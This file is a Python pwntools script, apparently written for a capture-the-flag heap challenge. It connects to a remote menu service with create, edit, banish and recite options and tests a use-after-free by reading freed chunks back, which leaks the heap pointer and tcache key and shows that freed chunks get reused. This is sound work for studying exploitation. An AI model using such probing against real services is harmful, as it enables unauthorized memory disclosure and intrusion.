#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def recvmenu(p):
    return p.recvuntil(b'> ')

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def edit(p, idx, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    # Read exactly `size` bytes of data, then the trailing newline
    data = p.recv(size)
    p.recv(1)  # consume the trailing newline
    return data

p = connect()
banner = recvmenu(p)
print("=== BANNER ===")
print(banner.decode(errors='replace'))

# Test 1: Create spell of size 0x80 (same as g_flag)
print("\n=== Test 1: Create spell 0 with size 0x80 ===")
create(p, 0, 0x80, b'A' * 0x7f + b'\n')
data = recite(p, 0, 0x80)
print(f"Spell 0 data: {data[:32]}...")
print(f"Spell 0 hex: {data[:32].hex()}")

# Banish spell 0
print("\n=== Banish spell 0 ===")
banish(p, 0)

# Recite spell 0 after banish (UAF read)
print("\n=== Recite spell 0 after banish (UAF) ===")
data = recite(p, 0, 0x80)
print(f"UAF data: {data[:32]}...")
print(f"UAF hex: {data.hex()}")

# Create spell 1 of size 0x80 - should reuse the freed chunk
print("\n=== Create spell 1 with size 0x80 ===")
create(p, 1, 0x80, b'B' * 0x7f + b'\n')
data = recite(p, 1, 0x80)
print(f"Spell 1 data: {data[:32]}...")

# Recite spell 0 again - should be the same as spell 1 now
print("\n=== Recite spell 0 again (should be same as spell 1) ===")
data = recite(p, 0, 0x80)
print(f"Spell 0 data: {data[:32]}...")

# Test 2: Create a small spell, banish, read UAF
print("\n=== Test 2: Create spell 2 with size 16 ===")
create(p, 2, 16, b'C' * 15 + b'\n')
data = recite(p, 2, 16)
print(f"Spell 2 data: {data.hex()}")

print("\n=== Banish spell 2 ===")
banish(p, 2)

print("\n=== Recite spell 2 after banish (UAF) ===")
data = recite(p, 2, 16)
print(f"UAF data: {data.hex()}")
# Interpret as two 8-byte values (little-endian)
if len(data) >= 16:
    fd = u64(data[0:8])
    key = u64(data[8:16])
    print(f"  fd = {hex(fd)}")
    print(f"  key = {hex(key)}")

p.sendline(b'0')
p.close()
